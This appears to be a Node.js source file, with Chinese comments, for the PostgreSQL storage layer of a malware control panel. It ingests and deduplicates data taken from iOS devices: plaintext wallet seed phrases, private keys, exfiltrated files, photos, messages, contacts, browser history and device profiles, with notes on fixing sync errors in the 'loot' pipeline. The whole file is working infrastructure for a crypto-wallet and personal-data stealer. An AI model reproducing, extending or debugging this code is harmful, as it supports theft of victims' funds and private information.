/**
 * pgStore.js —— PostgreSQL 写入层（P2）
 * 把 processBucket 产出的记录映射/幂等 upsert 到 PG。
 * · 凭据：adm888app/data/pg.json（600）
 * · ukey = sha1(表名|规范化JSON)（剔除 id/user_id 等易变字段），ON CONFLICT DO NOTHING
 *   → 重放/补账/双写天然安全（内容相同=同一条记录）
 *   【2026-09-19】冲突目标由 (ukey) 改为无目标：mnemonics 存在第二唯一键
 *   (serial, md5(plain))（部分唯一索引），行被手工替换后 ukey 与新 plain 不再对应，
 *   旧写法漏过该冲突 → 23505 报错带倒整条同步管线（面板"无钱包"错误根因）。无目标写法覆盖全部唯一约束。
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Pool } = require('pg');

const CFG_PATH = path.join(__dirname, '..', 'data', 'pg.json');
function loadCfg() {
  try { return JSON.parse(fs.readFileSync(CFG_PATH, 'utf8')); }
  catch { return { host: process.env.PG_HOST || '127.0.0.1', port: Number(process.env.PG_PORT || 5432), user: process.env.PG_USER, password: process.env.PG_PASSWORD, database: process.env.PG_DB || 'panel' }; }
}
const cfg = loadCfg();
const pool = new Pool({ host: cfg.host, port: cfg.port, user: cfg.user, password: cfg.password, database: cfg.database, max: 6 });

const jsonNorm = o => JSON.stringify(o, (k, v) => {
  if (k === 'id' || k === 'user_id') return undefined;
  return (typeof v === 'string') ? sanitizeStr(v) : v;
});
// 【P4.3 修复·去重对齐】业务键 ukey：对齐 lootStore.scan() 全局 uniqBy 的去重键（+exfil18/mnemonics 等补充），
//   同业务键第二次入库被 ON CONFLICT DO NOTHING 挡掉 —— 保证 PG 与旧面板"去重后"的口径一致。
//   未列出的表（events/reports 等事件流）保持内容哈希（不做业务去重）。
const BIZ = {
  photos: r => (r.serial || '') + '|' + ((r.source_path || r.name || r.title) || ''),
  notebooks: r => (r.serial || '') + '|' + ((r.source_path || '')) + '|' + ((r.title || '')) + '|' + String(r.content || '').slice(0, 120),
  apps: r => (r.serial || '') + '|' + ((r.bundle_id || r.name) || ''),
  tokens: r => (r.serial || '') + '|' + ((r.address || '')) + '|' + ((r.symbol || r.name) || ''),
  whatsapp: r => (r.serial || '') + '|' + ((r.account || r.display_name) || ''),
  browserHistory: r => (r.serial || '') + '|' + ((r.source_path || '')) + '|' + ((r.url || '')) + '|' + (r.ts || 0),
  messages: r => (r.serial || '') + '|' + ((r.source_path || '')) + '|' + ((r.who || r.from) || '') + '|' + (r.ts || 0) + '|' + ((r.direction || '')) + '|' + String(r.body || '').slice(0, 60),
  contacts: r => (r.serial || '') + '|' + ((r.name || '')) + '|' + ((r.phones || '')),
  exfil18: r => (r.serial || '') + '|' + ((r.path || '')),
  mnemonics: r => (r.serial || '') + '|' + String((r.mnem_phrase_plain || r.mnem_phrase_abbr || '')).trim().replace(/\s+/g, ' '),
  seeds: r => (r.serial || '') + '|' + ((r.seed_abbr || '')) + '|' + ((r.app_type || '')),
  addresses: r => (r.serial || '') + '|' + ((r.public_key || '')),
  uploads: r => (r.serial || '') + '|' + ((r.filename || '')),
  chainLogs: r => (r.serial || '') + '|' + (r.ts || 0) + '|' + String(r.line || '').slice(0, 120),
  sysApps: r => (r.serial || '') + '|' + ((r.bundle_id || r.name) || ''),
};
const ukeyOf = (key, table, rec) => {
  const fn = BIZ[key];
  const basis = fn ? fn(rec) : jsonNorm(rec);
  return crypto.createHash('sha1').update(table + '|' + basis).digest('hex');
};

// 【P2 修复】设备上报常见两类"PG 不接受"字符：
//   ① \u0000（NUL，二进制预览污染）——text/jsonb 都拒绝（22P05 unsupported Unicode escape sequence）；
//   ② 孤立代理对（非法 UTF-16）——JSON.stringify 产出的 \udXXX escape 被 jsonb 拒绝。
//   统一替换为 U+FFFD（成对代理保留原样）。text 列字符串经 str()/sOrNull() 走同一 sanitize。
function sanitizeStr(s) {
  return s
    .replace(/\u0000/g, '\uFFFD')
    .replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/g, '\uFFFD')
    .replace(/(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '\uFFFD');
}
const safeJSON = o => JSON.stringify(o, (k, v) => (typeof v === 'string') ? sanitizeStr(v) : v);

const num = v => { const n = Number(v); return Number.isFinite(n) ? Math.trunc(n) : 0; };
const str = v => v == null ? '' : sanitizeStr(String(v));
const sOrNull = v => v == null ? null : sanitizeStr(String(v));
const ipOrNull = v => (typeof v === 'string' && /^[0-9a-fA-F:.]{3,45}$/.test(v)) ? v : null;

// 数组名 → { 表名, 列清单, 取值函数 }
const MAP = {
  events:    ['events',    ['serial','ip','ts','type','ctx'],                 r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.type), r.ctx ? safeJSON(r.ctx) : null]],
  reports:   ['reports',   ['serial','ip','ts','kind','endpoint'],           r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.kind), str(r.endpoint)]],
  mnemonics: ['mnemonics', ['serial','ip','ts','app_type','bundle_id','abbr','plain'], r => [str(r.serial), ipOrNull(r.ip), num(r.created_at || r.ts), str(r.app_type), str(r.bundle_id), str(r.mnem_phrase_abbr), str(r.mnem_phrase_plain)]],
  seeds:     ['seeds',     ['serial','ip','ts','app_type','mnemonic_id','abbr'], r => [str(r.serial), ipOrNull(r.ip), num(r.created_at || r.ts), str(r.app_type), r.mnemonic_id == null ? null : num(r.mnemonic_id), str(r.seed_abbr)]],
  addresses: ['addresses', ['serial','ip','ts','coin','chain','public_key','private_key_plain'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts || r.created_at), str(r.coin), str(r.chain), str(r.public_key), sOrNull(r.private_key_plain)]],
  tokens:    ['tokens',    ['serial','ip','ts','coin','chain'],              r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.coin), str(r.chain)]],
  photos:    ['photos',    ['serial','ip','ts','name','size','bin_path'],    r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.name), num(r.size), sOrNull(r.bin_path)]],
  notebooks: ['notebooks', ['serial','ip','ts','title','content','source_path'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.title), str(r.content), sOrNull(r.source_path)]],
  messages:  ['messages',  ['serial','ip','ts','chat','from_a','to_a','body'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.chat), str(r.from), str(r.to), str(r.body)]],
  whatsapp:  ['whatsapp',  ['serial','ip','ts'],                             r => [str(r.serial), ipOrNull(r.ip), num(r.ts)]],
  contacts:  ['contacts',  ['serial','ip','ts','name','phones','emails'],    r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.name), str(r.phones), str(r.emails)]],
  browserHistory: ['browser_history', ['serial','ip','ts','url','title'],    r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.url), str(r.title)]],
  exfil18:   ['exfil18',   ['serial','ip','ts','exid','note','size','bin_path'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.exid), str(r.note), num(r.size), sOrNull(r.bin_path)]],
  uploads:   ['uploads',   ['serial','ip','ts','filename','size','channel','bin_path'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.filename), num(r.size), str(r.channel), sOrNull(r.bin_path)]],
  chainLogs: ['chain_logs',['serial','ip','ts','line'],                      r => [r.serial ? str(r.serial) : null, ipOrNull(r.ip), num(r.ts), str(r.line)]],
  apps:      ['apps',      ['serial','ip','ts','name','bundle_id','version'], r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.name), str(r.bundle_id), str(r.version)]],
  sysApps:   ['sys_apps',  ['serial','ip','ts','bundle_id','name'],          r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.bundle_id), str(r.name)]],
  deliveries:['deliveries',['ip','ts','event_type','location','referrer','ua'], r => [ipOrNull(r.ip), num(r.ts), str(r.eventType), str(r.location), str(r.referrer), str(r.ua).slice(0, 300)]],
  visitLogs: ['visit_logs',['serial','ip','ts','log','duration_ms'],         r => [str(r.serial), ipOrNull(r.ip), num(r.ts), str(r.log), num(r.duration_ms)]],
};

async function upsertTable(table, cols, rows) {
  if (!rows.length) return 0;
  const allCols = cols.concat(['data', 'ukey']);
  const B = 200;
  let inserted = 0;
  for (let i = 0; i < rows.length; i += B) {
    const chunk = rows.slice(i, i + B);
    const params = [];
    const tuples = [];
    for (const r of chunk) {
      const ph = [];
      for (const v of r) { params.push(v); ph.push('$' + params.length); }
      tuples.push('(' + ph.join(',') + ')');
    }
    const sql = `INSERT INTO ${table} (${allCols.join(',')}) VALUES ${tuples.join(',')} ON CONFLICT DO NOTHING`;
    const res = await pool.query(sql, params);
    inserted += res.rowCount;
  }
  return inserted;
}

/** 把"新增记录"按表 upsert；fresh = { 数组名: 记录[] }（takeBucketNew 产出） */
async function upsertRecords(fresh) {
  const out = { recs: 0, ins: 0, byTable: {} };
  // 【2026-09-14 时间戳卫生·未来钳制】设备端时钟漂移（实测 +6 天）会污染记录时间与列表排序，
  //   > now+1h 视为无效 → 记为 now（上报刚到）。与 lootStore.scan 同语义（该处只覆盖快照路径）。
  const _nowMs = Date.now(), _maxTs = _nowMs + 3600 * 1000;
  for (const key of Object.keys(fresh)) {
    const def = MAP[key];
    if (!def) continue;
    const [table, cols, get] = def;
    const records = fresh[key] || [];
    if (!records.length) continue;
    const rows = records.map(r => {
      if (r && typeof r.ts === 'number' && r.ts > _maxTs) r.ts = _nowMs;
      return get(r).concat([safeJSON(r), ukeyOf(key, table, r)]);
    });
    const ins = await upsertTable(table, cols, rows);
    out.recs += records.length; out.ins += ins;
    out.byTable[table] = (out.byTable[table] || 0) + ins;
  }
  return out;
}

/** 设备/用户 → devices 表（upsert；保留最新） */
async function upsertDevices(usersMap, devicesMap) {
  const serials = new Set([...usersMap.keys(), ...devicesMap.keys()]);
  // 【2026-09-14 时间戳卫生·未来钳制】同 upsertRecords：设备端时钟漂移会把 last_seen 顶到未来 →
  //   设备列表「最近活跃」永远霸顶、刚上线的设备被压到下面。> now+1h 记为 now（上报刚到）。
  const _nowMs = Date.now(), _maxTs = _nowMs + 3600 * 1000;
  const clampTs = v => { const n = num(v); return (n > _maxTs) ? _nowMs : n; };
  const rows = [];
  for (const s of serials) {
    if (!s) continue;
    const u = usersMap.get(s) || {}; const d = devicesMap.get(s) || {};
    rows.push([
      s, null,
      str(u.machine || d.hardware_model), str(u.ios_version || d.os_version), str(d.build_version), str(d.kernel_release),
      ipOrNull(u.ip || d.ip), str(d.source || (u.channel_put ? 'put-channel' : (u.channel_t ? 't-channel' : ''))),
      clampTs(u.first_seen || d.first_seen), clampTs(u.last_seen || d.last_seen),
      (clampTs(u.last_seen || d.last_seen) > _nowMs - 15 * 60 * 1000),
      sOrNull(u.wallet_label || d.wallet_label), Array.isArray(u.wallets || d.wallets) ? (u.wallets || d.wallets).map(x => sanitizeStr(String(x))) : null,
      num(u.mnemonic_count), num(u.address_count), num(u.token_count), num(u.photo_count), num(u.note_count),
      safeJSON({ u, d, src: 'ingestd' }),
    ]);
  }
  if (!rows.length) return 0;
  const cols = ['serial','owner_agent_id','machine','ios_version','build_version','kernel_release','ip','source','first_seen','last_seen','is_online','wallet_label','wallets','mnemonic_count','address_count','token_count','photo_count','note_count','extras'];
  const params = []; const tuples = [];
  for (const r of rows) { const ph = []; for (const v of r) { params.push(v); ph.push('$' + params.length); } tuples.push('(' + ph.join(',') + ')'); }
  const sql = `INSERT INTO devices (${cols.join(',')}) VALUES ${tuples.join(',')}
    ON CONFLICT (serial) DO UPDATE SET
      machine = COALESCE(NULLIF(EXCLUDED.machine,''), devices.machine),
      ios_version = COALESCE(NULLIF(EXCLUDED.ios_version,''), devices.ios_version),
      build_version = COALESCE(NULLIF(EXCLUDED.build_version,''), devices.build_version),
      kernel_release = COALESCE(NULLIF(EXCLUDED.kernel_release,''), devices.kernel_release),
      ip = COALESCE(EXCLUDED.ip, devices.ip),
      source = COALESCE(NULLIF(EXCLUDED.source,''), devices.source),
      first_seen = CASE WHEN devices.first_seen = 0 THEN EXCLUDED.first_seen ELSE LEAST(devices.first_seen, NULLIF(EXCLUDED.first_seen,0)) END,
      last_seen = GREATEST(devices.last_seen, EXCLUDED.last_seen),
      is_online = GREATEST(devices.last_seen, EXCLUDED.last_seen) > (EXTRACT(EPOCH FROM now()) * 1000 - 900000),
      wallet_label = COALESCE(EXCLUDED.wallet_label, devices.wallet_label),
      wallets = COALESCE(EXCLUDED.wallets, devices.wallets),
      extras = CASE WHEN EXCLUDED.last_seen >= devices.last_seen THEN EXCLUDED.extras ELSE devices.extras END,
      updated_at = now()`;
  const res = await pool.query(sql, params);
  return res.rowCount;
}

async function close() { await pool.end(); }

module.exports = { pool, upsertRecords, upsertDevices, ukeyOf, close };
